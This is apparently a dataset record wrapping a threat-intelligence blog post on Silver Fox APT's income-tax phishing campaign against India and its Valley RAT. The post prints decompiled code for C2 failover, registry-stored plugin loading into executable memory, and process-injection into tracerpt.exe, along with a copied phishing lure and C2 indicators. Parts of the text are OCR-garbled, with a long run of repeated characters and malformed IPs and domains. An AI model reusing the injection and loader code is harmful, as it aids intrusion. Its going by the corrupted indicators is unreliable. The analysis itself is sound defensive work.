config_o1_primary_port);\n\nconnection_type_flag = config_t1_primary_type;\n\nC2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;\n\nif ( ++failed_connection_counter == 200 )\n\nnullsub_1();\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);\n\nconnection_type_flag = config_t3_tertiary_type;\n\nfailed_connection_counter = 0;\n\nif ( v2 )\n\n(**void (_thiscall ***)(void *))v2)(v2);\n\nv2 = (void *)v15;\n\nif ( connection_type_flag != 1 )<｜end▁of▁sentence｜>\n  \n\nThe communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  \n\nUpon successful connection, Valley RAT sends a \"ready\" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary\n\n<--- Page Split --->\n\ntiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  \n\nif (!RegCreateKeyW(HKEY_CURRENT_USER, L\"Console\\\\0\", &hKey)) \n\n{\n\nRegDeleteValueW(hKey, L\"d33f351a4aeea5e608853d1a56661059\");\n\nRegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);\n\n}\n\nRegCloseKey(hKey);\n\noperator delete[](dst);\n\n}\n\nArgList_1 = ArgLista;\n\nv8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);\n\ngoto LABEL_21;\n\ntype = 3;\n\nbData = 0;\n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\\\\0\", 0, KEY_READ, &phkResult))\n\nRegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, 0, &cbData);\n\nif ( cbData > 0xA44 )\n\ndst_1 = (char *)operator new[](cbData);\n\nmemset(dst_1, 0, cbData);\n\nif (!RegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, (LPBYTE)dst_1, &cbData))\n\n{\n\nqmemcpy(&dst_, dst_1, 0xA44u);\n\nlpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\nmemcpy_0(lpAddress, dst_1 + 2628, Size);\n\n}\n\nhKey_1 = hKey;\n\n}\n\nRegCloseKey(phkResult);\n\nArgList_1 = ArgLista;<｜end▁of▁sentence｜>\n  \n\nValley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\\Console\\0\\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a hardcoded signature, and spawns execution threads.  \n\nEach plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  \n\nGetSystemDirectoryA(Buffer, @xFFu); \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\SysWOW64\\\\tracerpt.exe\"); \n\nif ( GetFileAttributesA(Buffer) == -1 ) \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\System32\\\\tracerpt.exe\"); \n\nresult = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); \n\nif ( result ) \n\nlpBaseAddress = VirtualAllocEx( \n\nlpProcessInformation->hProcess, 0, \n\ndwSize, \n\nMEM_COMMIT | MEM_RESERVE, \n\nPAGE_EXECUTE_READWRITE); \n\nif ( lpBaseAddress \n\n&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) \n\n&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) \n\n&& (hThread_1 = lpProcessInformation->hThread, \n\nContext.Eip = (DWORD)lpBaseAddress, \n\nSetThreadContext(hThread_1, &Context)) ) \n\n{ \n\nResumeThread(lpProcessInformation->hThread); \n\nreturn 1;<｜end▁of▁sentence｜>\n\n<center>Tracerpt Injection </center>  \n\nAfter downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  \n\n## Pivoting  \n\nLet's start with the C2 embedded within the decoy document \"ggwk[.]cc\".\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n  \n\nThe C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  \n\n<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nWe found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  \n\n<｜end▁of▁sentence｜>\n  \n\n## Diamond Model  \n\n## ADVERSARY \n\nThreat Actor: Silver Fox APT \n\nAttribution Confidence: High \n\nRationale: \n\nRaze of income-tax-themed lures previously observed in Silver Fox operations \n\nNGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain \n\nMotivations: Espionage / long-term access \n\nSophistication: High (anti-analysis, in-memory execution, living-off-the-land abuse) \n\n## VICTIM \n\n### Target Profile \n\nIndian enterprises and users \n\nFrance, tax, and business-relevant personas \n\n### Exposures \n\nUser-level compromise escalating to persistent RAT control \n\nLong dwell time risk due to stealthy registry persistence \n\n### Operational Risk \n\nSilent surveillance \n\nCredential theft \n\nSelective deployment of high-risk modules only when needed \n\n## Silver Fox APT - IncomeTax Campaign \n\n### CAPABILITY \n\n### Initial Access \n\nPhishing with government-themed PDF lure \n\n### Execution & Loader Chain \n\nNESS installer \n\nSigned binary DLL hijacking \n\nProcess hooking into explorer.exe \n\nDonut-generated in-memory loader \n\n### Stage 4: Valley RAT Core \n\nTwo-stage configuration system (embedded + registry override) \n\n22-parameter operational config \n\nMulti-tier CI loop with protocol switching \n\n### Post-Compromise Capabilities \n\nKeylogging (M) \n\nInteractive shell (sh) \n\nFile download / upload (df) \n\nFull backdoor mode (xd) \n\n### Modular Expansion \n\nPlugin delivery via CI \n\nIn-memory execution + registry persistence \n\nPlugin integrity checks and execution guards \n\n## INFRASTRUCTURE \n\nInitial Redirect / Decoy Hosting \n\ngop@.ix \n\nIP: 45.207.231.94 \n\nCommand & Control \n\nN: [yuxuanow].top \n\nIP: 103.20.199.2147 \n\nPlotted Infrastructure (Shared Favorites / Patrolled Domains) \n\nlald.club = 45.207.231.107 \n\ngov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 \n\nxqghw.com = 8.217.9.165 \n\ndngtaki.cn = 47.239.225.43 \n\nhiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 \n\nsec2020gb.cn, 2025wmm.cn = 43.100.123.207 \n\nhiko.wark = 43.100.63.145 \n\n### ASN reuse over time: AS112839, AS149801 \n\n### Design Characteristics \n\nThree-tier failover with retry thresholds (200 failures) \n\nMixed protocol support (HTTPs) + two TCPs \n\nRegistry-driven dynamic CI updates \n\nResilience Features<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\n## Impact  \n\nHigh risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  \n\n## Recommendations  \n\nMonitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\\Console\\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \\(\\leftrightarrow\\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  \n\n## Appendix  \n\n## IOCs  \n\n<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy Attachment</td></tr></table>\n\n<--- Page Split --->\n\n\n<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>", "format_code": "WriteProcessMemory(lpProcessInformation->hProcess,lpBaseAddress,lpBuffer,dwSize,0)", "hash": "hash"}
{"file_name": "fed9c11a-b86a-49a9-a9e2-24332f01a81c.md", "title": "Silver Fox Targeting India Using Tax Themed Phishing Lures", "malicious_code": "Context.Eip = (DWORD)lpBaseAddress;", "describe": "cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  \n\nPrajwal Awasthi  \n\nTable of Content  \n\nSubscribe to CloudSEK Resources  \n\nGet the latest industry news, threats and resources.  \n\n## Executive Summary  \n\nCloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  \n\n## Kill Chain  \n\n<｜end▁of▁sentence｜>\n  \n\n## Initial Access Vector  \n\nTOPSOE INDIA PRIVATE LIMITED \n\n \n\nस्वरोचन ने अधिकार - Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/\n  \n\nMalicious email  \n\nWe found an interesting email uploaded from India with just an attachment called \"TOPsoE India Private Limited\". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, \"ggwk[.]cc\" opens up on the browser and a zip file called \"tax affairs.exe\" is downloaded.\n\n<--- Page Split --->\n\nNo. TAX/PEN/2025-142 \n\nभारत सरकार / Government of India\nवित्त मंत्रालय / Ministry of Finance\nआयकर विभाग / Income Tax Department\nप्रवर्तन प्रभाग / Enforcement Division \n\nAayakar Bhavan,\nNew Delhi - 110001 \n\nOFFICE MEMORANDUM \n\nSub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice \n\n1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. \n\n2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. \n\nआवश्यक दस्तावेज सूची / Required Documents List\nनीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below \n\nदस्तावेज डाउनलोड करें / Download Documents \n\n3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. \n\n(राज कुमार शर्मा) \n\nRaj Kumar Sharma \n\nसहायक आयकर आयुक्त \n\nAssistant Commissioner of Income Tax \n\nTechnical Analysis \n\nStage - 1: Tax Affairs.zip \n\nPE32 \n\nOperation system: Windows(2000)[1386, 32-bit, GUI] \n\nLinker: Microsoft Linker(10.00.40219) \n\nCompiler: Microsoft Visual C/C++(16.00.40219)[C] \n\nLanguage: C \n\nTool: Visual Studio(2010) \n\n(Heur) Packer: Compressed or packed data[Strange overlay] \n\nInstaller: Nullsoft Scriptable Install System(2.46.5-ANSI) \n\nOverlay: Binary[Offset=0x00034c00,Size=0x002a2e40] \n\nUnknown: Unknown \n\nDetect It Easy \n\nUsing static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.\n\n<--- Page Split --->\nGetTempPathA(0x10000u, PathName); \n\nif ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, \"\\Temp\"), sub_4032CB()) \n\nDeleteFileA(FileName); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); \n\nif (!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) \n\nif (!dword_433C24 ) \n\n{ \n\nABEL_34: \n\nuExitCode = -1; \n\nuExitCode = sub_4052E6(); \n\ngoto LABEL_35; \n\n} \n\nfor ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, \"_=\", 4); --i ) \n\n; \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = \"Error launching installer\"; \n\nif ( i >= &sz ) \n\n{ \n\n* i = 0; \n\nlpString2_3 = i + 4; \n\nif ( !sub_405EFC(lpString2_3) ) \n\ngoto LABEL_35; \n\nlstrcpyAn_wrp(&lpString1_, lpString2_3); \n\nlstrcpyAn_wrp(Directory, lpString2_3); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; 